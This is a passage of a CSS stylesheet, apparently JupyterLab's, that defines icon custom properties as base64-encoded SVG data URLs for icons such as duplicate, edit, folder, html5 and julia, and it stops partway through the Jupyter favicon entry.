  --jp-icon-duplicate: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHZpZXdCb3g9IjAgMCAxNCAxNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggY2xhc3M9ImpwLWljb24zIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTIuNzk5OTggMC44NzVIOC44OTU4MkM5LjIwMDYxIDAuODc1IDkuNDQ5OTggMS4xMzkxNCA5LjQ0OTk4IDEuNDYxOThDOS40NDk5OCAxLjc4NDgyIDkuMjAwNjEgMi4wNDg5NiA4Ljg5NTgyIDIuMDQ4OTZIMy4zNTQxNUMzLjA0OTM2IDIuMDQ4OTYgMi43OTk5OCAyLjMxMzEgMi43OTk5OCAyLjYzNTk0VjkuNjc5NjlDMi43OTk5OCAxMC4wMDI1IDIuNTUwNjEgMTAuMjY2NyAyLjI0NTgyIDEwLjI2NjdDMS45NDEwMyAxMC4yNjY3IDEuNjkxNjUgMTAuMDAyNSAxLjY5MTY1IDkuNjc5NjlWMi4wNDg5NkMxLjY5MTY1IDEuNDAzMjggMi4xOTA0IDAuODc1IDIuNzk5OTggMC44NzVaTTUuMzY2NjUgMTEuOVY0LjU1SDExLjA4MzNWMTEuOUg1LjM2NjY1Wk00LjE0MTY1IDQuMTQxNjdDNC4xNDE2NSAzLjY5MDYzIDQuNTA3MjggMy4zMjUgNC45NTgzMiAzLjMyNUgxMS40OTE3QzExLjk0MjcgMy4zMjUgMTIuMzA4MyAzLjY5MDYzIDEyLjMwODMgNC4xNDE2N1YxMi4zMDgzQzEyLjMwODMgMTIuNzU5NCAxMS45NDI3IDEzLjEyNSAxMS40OTE3IDEzLjEyNUg0Ljk1ODMyQzQuNTA3MjggMTMuMTI1IDQuMTQxNjUgMTIuNzU5NCA0LjE0MTY1IDEyLjMwODNWNC4xNDE2N1oiIGZpbGw9IiM2MTYxNjEiLz4KPHBhdGggY2xhc3M9ImpwLWljb24zIiBkPSJNOS40MzU3NCA4LjI2NTA3SDguMzY0MzFWOS4zMzY1QzguMzY0MzEgOS40NTQzNSA4LjI2Nzg4IDkuNTUwNzggOC4xNTAwMiA5LjU1MDc4QzguMDMyMTcgOS41NTA3OCA3LjkzNTc0IDkuNDU0MzUgNy45MzU3NCA5LjMzNjVWOC4yNjUwN0g2Ljg2NDMxQzYuNzQ2NDUgOC4yNjUwNyA2LjY1MDAyIDguMTY4NjQgNi42NTAwMiA4LjA1MDc4QzYuNjUwMDIgNy45MzI5MiA2Ljc0NjQ1IDcuODM2NSA2Ljg2NDMxIDcuODM2NUg3LjkzNTc0VjYuNzY1MDdDNy45MzU3NCA2LjY0NzIxIDguMDMyMTcgNi41NTA3OCA4LjE1MDAyIDYuNTUwNzhDOC4yNjc4OCA2LjU1MDc4IDguMzY0MzEgNi42NDcyMSA4LjM2NDMxIDYuNzY1MDdWNy44MzY1SDkuNDM1NzRDOS41NTM2IDcuODM2NSA5LjY1MDAyIDcuOTMyOTIgOS42NTAwMiA4LjA1MDc4QzkuNjUwMDIgOC4xNjg2NCA5LjU1MzYgOC4yNjUwNyA5LjQzNTc0IDguMjY1MDdaIiBmaWxsPSIjNjE2MTYxIiBzdHJva2U9IiM2MTYxNjEiIHN0cm9rZS13aWR0aD0iMC41Ii8+Cjwvc3ZnPgo=);
  --jp-icon-edit: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTMgMTcuMjVWMjFoMy43NUwxNy44MSA5Ljk0bC0zLjc1LTMuNzVMMyAxNy4yNXpNMjAuNzEgNy4wNGMuMzktLjM5LjM5LTEuMDIgMC0xLjQxbC0yLjM0LTIuMzRjLS4zOS0uMzktMS4wMi0uMzktMS40MSAwbC0xLjgzIDEuODMgMy43NSAzLjc1IDEuODMtMS44M3oiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-ellipses: url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPGNpcmNsZSBjeD0iNSIgY3k9IjEyIiByPSIyIi8+CiAgICA8Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIyIi8+CiAgICA8Y2lyY2xlIGN4PSIxOSIgY3k9IjEyIiByPSIyIi8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-error: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KPGcgY2xhc3M9ImpwLWljb24zIiBmaWxsPSIjNjE2MTYxIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjE5IiByPSIyIi8+PHBhdGggZD0iTTEwIDNoNHYxMmgtNHoiLz48L2c+CjxwYXRoIGZpbGw9Im5vbmUiIGQ9Ik0wIDBoMjR2MjRIMHoiLz4KPC9zdmc+Cg==);
  --jp-icon-expand-all: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGgKICAgICAgICAgICAgZD0iTTggMmMxIDAgMTEgMCAxMiAwczIgMSAyIDJjMCAxIDAgMTEgMCAxMnMwIDItMiAyQzIwIDE0IDIwIDQgMjAgNFMxMCA0IDYgNGMwLTIgMS0yIDItMnoiIC8+CiAgICAgICAgPHBhdGgKICAgICAgICAgICAgZD0iTTE4IDhjMC0xLTEtMi0yLTJTNSA2IDQgNnMtMiAxLTIgMmMwIDEgMCAxMSAwIDEyczEgMiAyIDJjMSAwIDExIDAgMTIgMHMyLTEgMi0yYzAtMSAwLTExIDAtMTJ6bS0yIDB2MTJINFY4eiIgLz4KICAgICAgICA8cGF0aCBkPSJNMTEgMTBIOXYzSDZ2MmgzdjNoMnYtM2gzdi0yaC0zeiIgLz4KICAgIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-extension: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTIwLjUgMTFIMTlWN2MwLTEuMS0uOS0yLTItMmgtNFYzLjVDMTMgMi4xMiAxMS44OCAxIDEwLjUgMVM4IDIuMTIgOCAzLjVWNUg0Yy0xLjEgMC0xLjk5LjktMS45OSAydjMuOEgzLjVjMS40OSAwIDIuNyAxLjIxIDIuNyAyLjdzLTEuMjEgMi43LTIuNyAyLjdIMlYyMGMwIDEuMS45IDIgMiAyaDMuOHYtMS41YzAtMS40OSAxLjIxLTIuNyAyLjctMi43IDEuNDkgMCAyLjcgMS4yMSAyLjcgMi43VjIySDE3YzEuMSAwIDItLjkgMi0ydi00aDEuNWMxLjM4IDAgMi41LTEuMTIgMi41LTIuNVMyMS44OCAxMSAyMC41IDExeiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-fast-forward: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyIgZmlsbD0iIzYxNjE2MSI+CiAgICAgICAgPHBhdGggZD0iTTQgMThsOC41LTZMNCA2djEyem05LTEydjEybDguNS02TDEzIDZ6Ii8+CiAgICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-file-upload: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTkgMTZoNnYtNmg0bC03LTctNyA3aDR6bS00IDJoMTR2Mkg1eiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-file: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8cGF0aCBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBkPSJNMTkuMyA4LjJsLTUuNS01LjVjLS4zLS4zLS43LS41LTEuMi0uNUgzLjljLS44LjEtMS42LjktMS42IDEuOHYxNC4xYzAgLjkuNyAxLjYgMS42IDEuNmgxNC4yYy45IDAgMS42LS43IDEuNi0xLjZWOS40Yy4xLS41LS4xLS45LS40LTEuMnptLTUuOC0zLjNsMy40IDMuNmgtMy40VjQuOXptMy45IDEyLjdINC43Yy0uMSAwLS4yIDAtLjItLjJWNC43YzAtLjIuMS0uMy4yLS4zaDcuMnY0LjRzMCAuOC4zIDEuMWMuMy4zIDEuMS4zIDEuMS4zaDQuM3Y3LjJzLS4xLjItLjIuMnoiLz4KPC9zdmc+Cg==);
  --jp-icon-filter-dot: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiNGRkYiPgogICAgPHBhdGggZD0iTTE0LDEyVjE5Ljg4QzE0LjA0LDIwLjE4IDEzLjk0LDIwLjUgMTMuNzEsMjAuNzFDMTMuMzIsMjEuMSAxMi42OSwyMS4xIDEyLjMsMjAuNzFMMTAuMjksMTguN0MxMC4wNiwxOC40NyA5Ljk2LDE4LjE2IDEwLDE3Ljg3VjEySDkuOTdMNC4yMSw0LjYyQzMuODcsNC4xOSAzLjk1LDMuNTYgNC4zOCwzLjIyQzQuNTcsMy4wOCA0Ljc4LDMgNSwzVjNIMTlWM0MxOS4yMiwzIDE5LjQzLDMuMDggMTkuNjIsMy4yMkMyMC4wNSwzLjU2IDIwLjEzLDQuMTkgMTkuNzksNC42MkwxNC4wMywxMkgxNFoiIC8+CiAgPC9nPgogIDxnIGNsYXNzPSJqcC1pY29uLWRvdCIgZmlsbD0iI0ZGRiI+CiAgICA8Y2lyY2xlIGN4PSIxOCIgY3k9IjE3IiByPSIzIj48L2NpcmNsZT4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-filter-list: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTEwIDE4aDR2LTJoLTR2MnpNMyA2djJoMThWNkgzem0zIDdoMTJ2LTJINnYyeiIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-filter: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiNGRkYiPgogICAgPHBhdGggZD0iTTE0LDEyVjE5Ljg4QzE0LjA0LDIwLjE4IDEzLjk0LDIwLjUgMTMuNzEsMjAuNzFDMTMuMzIsMjEuMSAxMi42OSwyMS4xIDEyLjMsMjAuNzFMMTAuMjksMTguN0MxMC4wNiwxOC40NyA5Ljk2LDE4LjE2IDEwLDE3Ljg3VjEySDkuOTdMNC4yMSw0LjYyQzMuODcsNC4xOSAzLjk1LDMuNTYgNC4zOCwzLjIyQzQuNTcsMy4wOCA0Ljc4LDMgNSwzVjNIMTlWM0MxOS4yMiwzIDE5LjQzLDMuMDggMTkuNjIsMy4yMkMyMC4wNSwzLjU2IDIwLjEzLDQuMTkgMTkuNzksNC42MkwxNC4wMywxMkgxNFoiIC8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-folder-favorite: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjRweCIgdmlld0JveD0iMCAwIDI0IDI0IiB3aWR0aD0iMjRweCIgZmlsbD0iIzAwMDAwMCI+CiAgPHBhdGggZD0iTTAgMGgyNHYyNEgwVjB6IiBmaWxsPSJub25lIi8+PHBhdGggY2xhc3M9ImpwLWljb24zIGpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iIzYxNjE2MSIgZD0iTTIwIDZoLThsLTItMkg0Yy0xLjEgMC0yIC45LTIgMnYxMmMwIDEuMS45IDIgMiAyaDE2YzEuMSAwIDItLjkgMi0yVjhjMC0xLjEtLjktMi0yLTJ6bS0yLjA2IDExTDE1IDE1LjI4IDEyLjA2IDE3bC43OC0zLjMzLTIuNTktMi4yNCAzLjQxLS4yOUwxNSA4bDEuMzQgMy4xNCAzLjQxLjI5LTIuNTkgMi4yNC43OCAzLjMzeiIvPgo8L3N2Zz4K);
  --jp-icon-folder: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBjbGFzcz0ianAtaWNvbjMganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBkPSJNMTAgNEg0Yy0xLjEgMC0xLjk5LjktMS45OSAyTDIgMThjMCAxLjEuOSAyIDIgMmgxNmMxLjEgMCAyLS45IDItMlY4YzAtMS4xLS45LTItMi0yaC04bC0yLTJ6Ii8+Cjwvc3ZnPgo=);
  --jp-icon-home: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMjRweCIgdmlld0JveD0iMCAwIDI0IDI0IiB3aWR0aD0iMjRweCIgZmlsbD0iIzAwMDAwMCI+CiAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGNsYXNzPSJqcC1pY29uMyBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiM2MTYxNjEiIGQ9Ik0xMCAyMHYtNmg0djZoNXYtOGgzTDEyIDMgMiAxMmgzdjh6Ii8+Cjwvc3ZnPgo=);
  --jp-icon-html5: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDUxMiA1MTIiPgogIDxwYXRoIGNsYXNzPSJqcC1pY29uMCBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiMwMDAiIGQ9Ik0xMDguNCAwaDIzdjIyLjhoMjEuMlYwaDIzdjY5aC0yM1Y0NmgtMjF2MjNoLTIzLjJNMjA2IDIzaC0yMC4zVjBoNjMuN3YyM0gyMjl2NDZoLTIzbTUzLjUtNjloMjQuMWwxNC44IDI0LjNMMzEzLjIgMGgyNC4xdjY5aC0yM1YzNC44bC0xNi4xIDI0LjgtMTYuMS0yNC44VjY5aC0yMi42bTg5LjItNjloMjN2NDYuMmgzMi42VjY5aC01NS42Ii8+CiAgPHBhdGggY2xhc3M9ImpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iI2U0NGQyNiIgZD0iTTEwNy42IDQ3MWwtMzMtMzcwLjRoMzYyLjhsLTMzIDM3MC4yTDI1NS43IDUxMiIvPgogIDxwYXRoIGNsYXNzPSJqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiNmMTY1MjkiIGQ9Ik0yNTYgNDgwLjVWMTMxaDE0OC4zTDM3NiA0NDciLz4KICA8cGF0aCBjbGFzcz0ianAtaWNvbi1zZWxlY3RhYmxlLWludmVyc2UiIGZpbGw9IiNlYmViZWIiIGQ9Ik0xNDIgMTc2LjNoMTE0djQ1LjRoLTY0LjJsNC4yIDQ2LjVoNjB2NDUuM0gxNTQuNG0yIDIyLjhIMjAybDMuMiAzNi4zIDUwLjggMTMuNnY0Ny40bC05My4yLTI2Ii8+CiAgPHBhdGggY2xhc3M9ImpwLWljb24tc2VsZWN0YWJsZS1pbnZlcnNlIiBmaWxsPSIjZmZmIiBkPSJNMzY5LjYgMTc2LjNIMjU1Ljh2NDUuNGgxMDkuNm0tNC4xIDQ2LjVIMjU1Ljh2NDUuNGg1NmwtNS4zIDU5LTUwLjcgMTMuNnY0Ny4ybDkzLTI1LjgiLz4KPC9zdmc+Cg==);
  --jp-icon-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8cGF0aCBjbGFzcz0ianAtaWNvbi1icmFuZDQganAtaWNvbi1zZWxlY3RhYmxlLWludmVyc2UiIGZpbGw9IiNGRkYiIGQ9Ik0yLjIgMi4yaDE3LjV2MTcuNUgyLjJ6Ii8+CiAgPHBhdGggY2xhc3M9ImpwLWljb24tYnJhbmQwIGpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iIzNGNTFCNSIgZD0iTTIuMiAyLjJ2MTcuNWgxNy41bC4xLTE3LjVIMi4yem0xMi4xIDIuMmMxLjIgMCAyLjIgMSAyLjIgMi4ycy0xIDIuMi0yLjIgMi4yLTIuMi0xLTIuMi0yLjIgMS0yLjIgMi4yLTIuMnpNNC40IDE3LjZsMy4zLTguOCAzLjMgNi42IDIuMi0zLjIgNC40IDUuNEg0LjR6Ii8+Cjwvc3ZnPgo=);
  --jp-icon-info: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDUwLjk3OCA1MC45NzgiPgoJPGcgY2xhc3M9ImpwLWljb24zIiBmaWxsPSIjNjE2MTYxIj4KCQk8cGF0aCBkPSJNNDMuNTIsNy40NThDMzguNzExLDIuNjQ4LDMyLjMwNywwLDI1LjQ4OSwwQzE4LjY3LDAsMTIuMjY2LDIuNjQ4LDcuNDU4LDcuNDU4CgkJCWMtOS45NDMsOS45NDEtOS45NDMsMjYuMTE5LDAsMzYuMDYyYzQuODA5LDQuODA5LDExLjIxMiw3LjQ1NiwxOC4wMzEsNy40NThjMCwwLDAuMDAxLDAsMC4wMDIsMAoJCQljNi44MTYsMCwxMy4yMjEtMi42NDgsMTguMDI5LTcuNDU4YzQuODA5LTQuODA5LDcuNDU3LTExLjIxMiw3LjQ1Ny0xOC4wM0M1MC45NzcsMTguNjcsNDguMzI4LDEyLjI2Niw0My41Miw3LjQ1OHoKCQkJIE00Mi4xMDYsNDIuMTA1Yy00LjQzMiw0LjQzMS0xMC4zMzIsNi44NzItMTYuNjE1LDYuODcyaC0wLjAwMmMtNi4yODUtMC4wMDEtMTIuMTg3LTIuNDQxLTE2LjYxNy02Ljg3MgoJCQljLTkuMTYyLTkuMTYzLTkuMTYyLTI0LjA3MSwwLTMzLjIzM0MxMy4zMDMsNC40NCwxOS4yMDQsMiwyNS40ODksMmM2LjI4NCwwLDEyLjE4NiwyLjQ0LDE2LjYxNyw2Ljg3MgoJCQljNC40MzEsNC40MzEsNi44NzEsMTAuMzMyLDYuODcxLDE2LjYxN0M0OC45NzcsMzEuNzcyLDQ2LjUzNiwzNy42NzUsNDIuMTA2LDQyLjEwNXoiLz4KCQk8cGF0aCBkPSJNMjMuNTc4LDMyLjIxOGMtMC4wMjMtMS43MzQsMC4xNDMtMy4wNTksMC40OTYtMy45NzJjMC4zNTMtMC45MTMsMS4xMS0xLjk5NywyLjI3Mi0zLjI1MwoJCQljMC40NjgtMC41MzYsMC45MjMtMS4wNjIsMS4zNjctMS41NzVjMC42MjYtMC43NTMsMS4xMDQtMS40NzgsMS40MzYtMi4xNzVjMC4zMzEtMC43MDcsMC40OTUtMS41NDEsMC40OTUtMi41CgkJCWMwLTEuMDk2LTAuMjYtMi4wODgtMC43NzktMi45NzljLTAuNTY1LTAuODc5LTEuNTAxLTEuMzM2LTIuODA2LTEuMzY5Yy0xLjgwMiwwLjA1Ny0yLjk4NSwwLjY2Ny0zLjU1LDEuODMyCgkJCWMtMC4zMDEsMC41MzUtMC41MDMsMS4xNDEtMC42MDcsMS44MTRjLTAuMTM5LDAuNzA3LTAuMjA3LDEuNDMyLTAuMjA3LDIuMTc0aC0yLjkzN2MtMC4wOTEtMi4yMDgsMC40MDctNC4xMTQsMS40OTMtNS43MTkKCQkJYzEuMDYyLTEuNjQsMi44NTUtMi40ODEsNS4zNzgtMi41MjdjMi4xNiwwLjAyMywzLjg3NCwwLjYwOCw1LjE0MSwxLjc1OGMxLjI3OCwxLjE2LDEuOTI5LDIuNzY0LDEuOTUsNC44MTEKCQkJYzAsMS4xNDItMC4xMzcsMi4xMTEtMC40MSwyLjkxMWMtMC4zMDksMC44NDUtMC43MzEsMS41OTMtMS4yNjgsMi4yNDNjLTAuNDkyLDAuNjUtMS4wNjgsMS4zMTgtMS43MywyLjAwMgoJCQljLTAuNjUsMC42OTctMS4zMTMsMS40NzktMS45ODcsMi4zNDZjLTAuMjM5LDAuMzc3LTAuNDI5LDAuNzc3LTAuNTY1LDEuMTk5Yy0wLjE2LDAuOTU5LTAuMjE3LDEuOTUxLTAuMTcxLDIuOTc5CgkJCUMyNi41ODksMzIuMjE4LDIzLjU3OCwzMi4yMTgsMjMuNTc4LDMyLjIxOHogTTIzLjU3OCwzOC4yMnYtMy40ODRoMy4wNzZ2My40ODRIMjMuNTc4eiIvPgoJPC9nPgo8L3N2Zz4K);
  --jp-icon-inspector: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBjbGFzcz0ianAtaW5zcGVjdG9yLWljb24tY29sb3IganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjNjE2MTYxIiBkPSJNMjAgNEg0Yy0xLjEgMC0xLjk5LjktMS45OSAyTDIgMThjMCAxLjEuOSAyIDIgMmgxNmMxLjEgMCAyLS45IDItMlY2YzAtMS4xLS45LTItMi0yem0tNSAxNEg0di00aDExdjR6bTAtNUg0VjloMTF2NHptNSA1aC00VjloNHY5eiIvPgo8L3N2Zz4K);
  --jp-icon-json: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDIyIDIyIj4KICA8ZyBjbGFzcz0ianAtanNvbi1pY29uLWNvbG9yIGpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iI0Y5QTgyNSI+CiAgICA8cGF0aCBkPSJNMjAuMiAxMS44Yy0xLjYgMC0xLjcuNS0xLjcgMSAwIC40LjEuOS4xIDEuMy4xLjUuMS45LjEgMS4zIDAgMS43LTEuNCAyLjMtMy41IDIuM2gtLjl2LTEuOWguNWMxLjEgMCAxLjQgMCAxLjQtLjggMC0uMyAwLS42LS4xLTEgMC0uNC0uMS0uOC0uMS0xLjIgMC0xLjMgMC0xLjggMS4zLTItMS4zLS4yLTEuMy0uNy0xLjMtMiAwLS40LjEtLjguMS0xLjIuMS0uNC4xLS43LjEtMSAwLS44LS40LS43LTEuNC0uOGgtLjVWNC4xaC45YzIuMiAwIDMuNS43IDMuNSAyLjMgMCAuNC0uMS45LS4xIDEuMy0uMS41LS4xLjktLjEgMS4zIDAgLjUuMiAxIDEuNyAxdjEuOHpNMS44IDEwLjFjMS42IDAgMS43LS41IDEuNy0xIDAtLjQtLjEtLjktLjEtMS4zLS4xLS41LS4xLS45LS4xLTEuMyAwLTEuNiAxLjQtMi4zIDMuNS0yLjNoLjl2MS45aC0uNWMtMSAwLTEuNCAwLTEuNC44IDAgLjMgMCAuNi4xIDEgMCAuMi4xLjYuMSAxIDAgMS4zIDAgMS44LTEuMyAyQzYgMTEuMiA2IDExLjcgNiAxM2MwIC40LS4xLjgtLjEgMS4yLS4xLjMtLjEuNy0uMSAxIDAgLjguMy44IDEuNC44aC41djEuOWgtLjljLTIuMSAwLTMuNS0uNi0zLjUtMi4zIDAtLjQuMS0uOS4xLTEuMy4xLS41LjEtLjkuMS0xLjMgMC0uNS0uMi0xLTEuNy0xdi0xLjl6Ii8+CiAgICA8Y2lyY2xlIGN4PSIxMSIgY3k9IjEzLjgiIHI9IjIuMSIvPgogICAgPGNpcmNsZSBjeD0iMTEiIGN5PSI4LjIiIHI9IjIuMSIvPgogIDwvZz4KPC9zdmc+Cg==);
  --jp-icon-julia: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDMyNSAzMDAiPgogIDxnIGNsYXNzPSJqcC1icmFuZDAganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjY2IzYzMzIj4KICAgIDxwYXRoIGQ9Ik0gMTUwLjg5ODQzOCAyMjUgQyAxNTAuODk4NDM4IDI2Ni40MjE4NzUgMTE3LjMyMDMxMiAzMDAgNzUuODk4NDM4IDMwMCBDIDM0LjQ3NjU2MiAzMDAgMC44OTg0MzggMjY2LjQyMTg3NSAwLjg5ODQzOCAyMjUgQyAwLjg5ODQzOCAxODMuNTc4MTI1IDM0LjQ3NjU2MiAxNTAgNzUuODk4NDM4IDE1MCBDIDExNy4zMjAzMTIgMTUwIDE1MC44OTg0MzggMTgzLjU3ODEyNSAxNTAuODk4NDM4IDIyNSIvPgogIDwvZz4KICA8ZyBjbGFzcz0ianAtYnJhbmQwIGpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iIzM4OTgyNiI+CiAgICA8cGF0aCBkPSJNIDIzNy41IDc1IEMgMjM3LjUgMTE2LjQyMTg3NSAyMDMuOTIxODc1IDE1MCAxNjIuNSAxNTAgQyAxMjEuMDc4MTI1IDE1MCA4Ny41IDExNi40MjE4NzUgODcuNSA3NSBDIDg3LjUgMzMuNTc4MTI1IDEyMS4wNzgxMjUgMCAxNjIuNSAwIEMgMjAzLjkyMTg3NSAwIDIzNy41IDMzLjU3ODEyNSAyMzcuNSA3NSIvPgogIDwvZz4KICA8ZyBjbGFzcz0ianAtYnJhbmQwIGpwLWljb24tc2VsZWN0YWJsZSIgZmlsbD0iIzk1NThiMiI+CiAgICA8cGF0aCBkPSJNIDMyNC4xMDE1NjIgMjI1IEMgMzI0LjEwMTU2MiAyNjYuNDIxODc1IDI5MC41MjM0MzggMzAwIDI0OS4xMDE1NjIgMzAwIEMgMjA3LjY3OTY4OCAzMDAgMTc0LjEwMTU2MiAyNjYuNDIxODc1IDE3NC4xMDE1NjIgMjI1IEMgMTc0LjEwMTU2MiAxODMuNTc4MTI1IDIwNy42Nzk2ODggMTUwIDI0OS4xMDE1NjIgMTUwIEMgMjkwLjUyMzQzOCAxNTAgMzI0LjEwMTU2MiAxODMuNTc4MTI1IDMyNC4xMDE1NjIgMjI1Ii8+CiAgPC9nPgo8L3N2Zz4K);
  --jp-icon-jupyter-favicon: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUyIiBoZWlnaHQ9IjE2NSIgdmlld0JveD0iMCAwIDE1MiAxNjUiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgPGcgY2xhc3M9ImpwLWp1cHl0ZXItaWNvbi1jb2xvciIgZmlsbD0iI0YzNzcyNiI+CiAgICA8cGF0aCB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjA3ODk0NywgMTEwLjU4MjkyNykiIGQ9Ik03NS45NDIyODQyLDI5LjU4MDQ1NjEgQzQzLjMwMjM5NDcsMjkuNTgwNDU2MSAxNC43OTY3ODMyLDE3LjY1MzQ2MzQgMCwwIEM1LjUxMDgzMjExLDE1Ljg0MDY4MjkgMTUuNzgxNTM4OSwyOS41NjY3NzMyIDI5LjM5MDQ5NDcsMzkuMjc4NDE3MSBDNDIuOTk5Nyw0OC45ODk4NTM3IDU5LjI3MzcsNTQuMjA2NzgwNSA3NS45NjA1Nzg5LDU0LjIwNjc4MDUgQzkyLjY0NzQ1NzksNTQuMjA2NzgwNSAxMDguOTIxNDU4LDQ4Ljk4OTg1MzcgMTIyLjUzMDY2MywzOS4yNzg0MTcxIEMxMzYuMTM5NDUzLDI5LjU2Njc3MzIgMTQ2LjQxMDI4NCwxNS44ND